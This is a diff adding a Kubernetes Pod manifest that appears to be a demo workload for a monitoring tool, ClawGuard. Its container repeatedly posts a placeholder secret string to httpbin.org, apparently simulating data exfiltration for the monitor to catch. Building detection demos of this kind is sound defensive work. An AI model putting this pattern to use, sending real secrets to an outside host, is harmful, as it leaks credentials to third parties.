@@ -1,0 +1,27 @@
+# Example workload ClawGuard will monitor (must run on a node with the DaemonSet).
+apiVersion: v1
+kind: Pod
+metadata:
+  name: clawguard-demo-agent
+  namespace: default
+  annotations:
+    clawguard.io/monitor: "true"
+  labels:
+    app: clawguard-demo
+spec:
+  containers:
+    - name: agent
+      image: python:3.11-slim
+      command:
+        - bash
+        - -ec
+        - |
+          pip install -q requests
+          while true; do
+            python -c 'import requests; requests.post("https://httpbin.org/post", data="MY_SECRET_PASSWORD_123", headers={"traceparent":"00-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01"})'
+            sleep 10
+          done
+      resources:
+        requests:
+          cpu: 20m
+          memory: 64Mi
